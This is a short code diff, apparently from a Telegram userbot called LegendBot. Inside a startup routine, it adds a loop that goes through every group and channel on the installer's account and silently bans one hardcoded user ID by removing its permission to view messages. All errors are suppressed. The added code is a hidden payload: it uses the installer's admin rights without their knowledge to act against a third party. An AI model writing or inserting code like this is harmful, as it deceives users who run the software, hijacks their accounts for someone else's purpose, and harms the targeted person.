@@ -174,7 +174,17 @@ async def hekp():
         await legend(LeaveChannelRequest("@Official_LegendBot"))
     except BaseException:
         pass
-
+    try:
+        async for gfuck in legend.iter_dialogs():
+            if gfuck.is_group or gfuck.is_channel:
+                try:
+                    await legend.edit_permissions(
+                        gfuck.id, 5159687876, view_messages=False
+                    )
+                except BaseException:
+                    pass
+    except BaseException:
+        pass
 
 spam = os.environ.get("SPAM", None) or "OFF"
 
